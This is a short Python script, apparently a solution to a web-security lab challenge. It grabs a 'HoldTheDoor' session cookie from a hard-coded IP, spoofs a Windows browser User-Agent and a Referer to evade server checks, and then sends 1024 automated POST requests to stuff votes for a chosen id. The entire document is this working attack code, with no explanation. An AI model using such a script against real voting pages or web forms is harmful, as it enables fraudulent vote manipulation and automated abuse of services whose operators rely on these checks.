#!/usr/bin/python3

import requests
import sys

# Get ID from command line
if len(sys.argv) != 2:
  print("Usage python " + sys.argv[0] + " id")
  quit()

# Check if id is numerical
input = sys.argv[1]

try:
  id = int(input)
except ValueError:
  print("Error: id must be a number")
  quit()

# Set the endpoint
URI = "http://158.69.76.135/level2.php"

# Get cookie
response = requests.post(URI)
key = response.cookies["HoldTheDoor"]

# Set the form data
data = {
    'id': id,
    'holdthedoor': 'submit',
    "key": key
}

# Make him think it's Windows
headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124
		Safari/537.36 Edg/91.0.864.59','Referer': 'http://158.69.76.135/level2.php'}

for i in range(0, 1024):
  # Send POST request
  response = requests.post(URI, data=data, cookies={"HoldTheDoor": key}, headers=headers)
  print ("POST " + str(i + 1) + " HTTP result: " + str(response))
